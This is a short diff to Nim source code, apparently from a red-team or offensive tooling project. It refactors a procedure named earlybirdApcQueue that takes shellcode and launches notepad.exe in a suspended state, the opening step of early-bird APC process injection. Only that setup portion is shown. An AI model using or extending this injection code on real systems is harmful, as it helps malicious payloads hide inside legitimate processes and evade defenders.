@@ -4,29 +4,19 @@ import winim
 import winim/lean
 
 proc earlybirdApcQueue[byte](shellcode: openArray[byte]): void =
+  let
+    processImage: string = r"notepad.exe"
   var
-      si: STARTUPINFOEX
-      pi: PROCESS_INFORMATION
-      ps: SECURITY_ATTRIBUTES
-      ts: SECURITY_ATTRIBUTES
-      res: WINBOOL
-      pHandle: HANDLE
-      tHandle: HANDLE
-      bytesWritten: SIZE_T
-      oldprotect: DWORD = 0
+    si: STARTUPINFOEX
+    pi: PROCESS_INFORMATION
+    ps: SECURITY_ATTRIBUTES
+    ts: SECURITY_ATTRIBUTES
+    pHandle: HANDLE
+    tHandle: HANDLE
+    bytesWritten: SIZE_T
+    oldprotect: DWORD = 0
 
-  res = CreateProcess(
-      NULL,
-      newWideCString(r"notepad.exe"),
-      ps,
-      ts, 
-      TRUE,
-      CREATE_SUSPENDED,
-      NULL,
-      NULL,
-      addr si.StartupInfo,
-      addr pi
-  )
+  CreateProcess(NULL, newWideCString(processImage), ps, ts, TRUE, CREATE_SUSPENDED, NULL, NULL, addr si.StartupInfo, addr pi)
 
   pHandle = pi.hProcess
   tHandle = pi.hThread
